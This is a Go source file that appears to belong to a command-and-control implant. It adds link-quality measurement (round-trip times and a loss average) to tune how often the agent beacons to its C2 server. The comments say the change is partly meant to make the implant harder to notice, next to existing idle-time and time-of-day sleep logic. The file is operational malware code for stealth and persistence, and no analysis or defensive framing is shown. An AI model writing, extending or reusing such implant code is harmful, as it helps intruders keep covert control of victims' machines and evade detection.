//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"sync"
	"time"
)

// Link-quality adaptation for beacon cadence. The agent already changed its
// sleep by wall-clock window and user idleness, but never measured the link
// itself: a saturated/lossy path kept hammering the C2 at the fast interval,
// which makes both delivery worse and the implant easier to notice.
//
// The measurement is deliberately cheap: one timestamp around each beacon
// exchange, a small RTT ring and an EWMA loss ratio. No extra packets are sent.
// All decisions are pure functions of a snapshot, so they are testable without
// a network or a real clock.
const (
	linkQualitySamples = 8
	linkRTTGood        = 400 * time.Millisecond
	linkRTTPoor        = 4 * time.Second
	linkLossDecay      = 0.7 // EWMA weight of the previous ratio
	linkNeutralScore   = 70
)

var linkState struct {
	mu       sync.Mutex
	rtts     []time.Duration
	lossEWMA float64
	total    int
}

type linkStats struct {
	Samples  int
	Median   time.Duration
	LossEWMA float64
	Total    int
}

// observeBeaconResult records one completed exchange. ok=false means the
// transport returned nothing (dial/read/parse failure); fast-mode retries and
// explicit backoff still own their own state, this is only a quality signal.
func observeBeaconResult(rtt time.Duration, ok bool) {
	linkState.mu.Lock()
	defer linkState.mu.Unlock()
	if ok {
		if rtt < 0 {
			rtt = 0
		}
		if len(linkState.rtts) >= linkQualitySamples {
			linkState.rtts = append(linkState.rtts[:0], linkState.rtts[1:]...)
		}
		linkState.rtts = append(linkState.rtts, rtt)
	}
	miss := 0.0
	if !ok {
		miss = 1.0
	}
	linkState.lossEWMA = linkState.lossEWMA*linkLossDecay + miss*(1-linkLossDecay)
	linkState.total++
}

// snapshotLink copies the state under one lock so scoring never races a beacon.
func snapshotLink() linkStats {
	linkState.mu.Lock()
	defer linkState.mu.Unlock()
	stats := linkStats{
		Samples:  len(linkState.rtts),
		LossEWMA: linkState.lossEWMA,
		Total:    linkState.total,
	}
	if len(linkState.rtts) == 0 {
		return stats
	}
	sorted := append([]time.Duration(nil), linkState.rtts...)
	for i := 1; i < len(sorted); i++ {
		for j := i; j > 0 && sorted[j] < sorted[j-1]; j-- {
			sorted[j], sorted[j-1] = sorted[j-1], sorted[j]
		}
	}
	stats.Median = sorted[len(sorted)/2]
	return stats
}

// linkQualityScore maps median RTT and loss ratio into 0..100.
// 0 samples is NEUTRAL: an agent that has never completed a beacon must not
// change its cadence because of a default value.
func linkQualityScore(stats linkStats) int {
	if stats.Samples == 0 {
		return linkNeutralScore
	}
	rttScore := 100.0
	if stats.Median > linkRTTGood {
		span := float64(linkRTTPoor - linkRTTGood)
		rttScore = 100 - 100*clamp01(float64(stats.Median-linkRTTGood)/span)
	}
	lossScore := 100 - 100*clamp01(stats.LossEWMA)
	score := int(rttScore*0.65 + lossScore*0.35 + 0.5)
	if score < 0 {
		return 0
	}
	if score > 100 {
		return 100
	}
	return score
}

func clamp01(v float64) float64 {
	if v < 0 {
		return 0
	}
	if v > 1 {
		return 1
	}
	return v
}

// linkQualityScale returns the multiplier for the beacon sleep. A healthy link
// tightens slightly; a bad one backs off, but never beyond 1.75x so a slow
// network cannot make an agent effectively unreachable.
func linkQualityScale(score int) float64 {
	switch {
	case score >= 90:
		return 0.85
	case score >= 70:
		return 1.0
	case score >= 40:
		return 1.25
	default:
		return 1.75
	}
}

// currentLinkScale is the value computeSleepDuration applies.
func currentLinkScale() float64 {
	return linkQualityScale(linkQualityScore(snapshotLink()))
}
